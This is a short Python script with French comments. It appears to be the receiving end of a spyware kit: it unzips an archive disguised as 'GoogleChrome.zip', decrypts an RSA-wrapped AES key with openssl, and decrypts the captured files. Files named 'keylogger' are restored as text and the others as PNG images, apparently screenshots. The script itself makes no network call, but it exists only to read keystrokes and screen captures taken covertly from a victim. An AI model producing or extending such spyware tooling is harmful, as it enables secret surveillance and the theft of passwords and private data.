import subprocess
import zipfile
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def unzip_file(zip_file_path, extract_to):
    """decompresse fichier zip"""
    os.makedirs(extract_to, exist_ok=True)
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)


def decrypt_key_aes(encrypted_file_path, private_key_file):
    """dechiffre la cle aes avec le cle priversa"""

    decrypted_aes_key = "C:\\Users\\user\\Downloads\\spy\\aes_key.txt"
    command = ["openssl.exe", "pkeyutl","-decrypt", "-in", encrypted_file_path,"-out", decrypted_aes_key, "-inkey", private_key_file]
    subprocess.run(command, check=True)
    return decrypted_aes_key


def read_aes_key(key_file):
    """lit cle aes"""

    with open(key_file, 'rb') as f:
        key = f.read()
    return key


def decrypt_aes(input_file, aes_key_path, decrypted_folder):
    """dechiffre fichier chiffre et le met dans un dossier"""

    key = read_aes_key(aes_key_path)
    base_name = os.path.splitext(input_file)[0]
    filename = os.path.basename(input_file)

    
    if filename.startswith("keylogger"):
        output_file = base_name + '.txt'
    elif filename.startswith("aes_key"):
        return  
    else:
        output_file = base_name + '.png'

   
    os.makedirs(decrypted_folder, exist_ok=True)

    #chemin du fichier dechiffre
    output_file = os.path.join(decrypted_folder, os.path.basename(output_file))

    #lit le fichier chiffre
    with open(input_file, 'rb') as f_in:
         #lit le vecteur d'init 
        vecteur_init = f_in.read(16) 
        cipher_text = f_in.read()    

     #dechiffre contenu avec aes mode cfb
    cipher = Cipher(algorithms.AES(key), modes.CFB(vecteur_init), backend=default_backend())
    decryptor = cipher.decryptor()
    plain_text = decryptor.update(cipher_text) + decryptor.finalize()

    
     #ecrit le fichier dechiffre
    with open(output_file, 'wb') as f_out:
        f_out.write(plain_text)

    

def decryption(unzip, aes_key_path, decrypted_folder):
    """dechiffre les fichiers du unzip """
    for filename in os.listdir(unzip):
        input_file_path = os.path.join(unzip, filename)
        
        # Déchiffrer les fichiers (sauf aes_key)
        if not filename.startswith("aes_key"):
            decrypt_aes(input_file_path, aes_key_path, decrypted_folder)

#fichier zip a dezipper
zip_file_path = 'C:\\Users\\user\\Downloads\\GoogleChrome.zip'
unzip = 'C:\\Users\\user\\Downloads\\spy'
unzip_file(zip_file_path, unzip)

 #cle privee pour dechiffrer cle aes
private_key_file = os.getenv('PRIV_KEY')
#cle aes chiffree
encrypt_aes_key = "C:\\Users\\user\\Downloads\\spy\\aes_key.enc"
#dechiffre cle aes
aes_key_path = decrypt_key_aes(encrypt_aes_key, private_key_file)

# Dossier où les fichiers déchiffrés seront placés
decrypted_folder = "C:\\Users\\user\\Downloads\\spy\\dechiffre"
# Déchiffrer tous les fichiers dans le dossier spy et les placer dans decrypted_folder
decryption(unzip, aes_key_path, decrypted_folder)
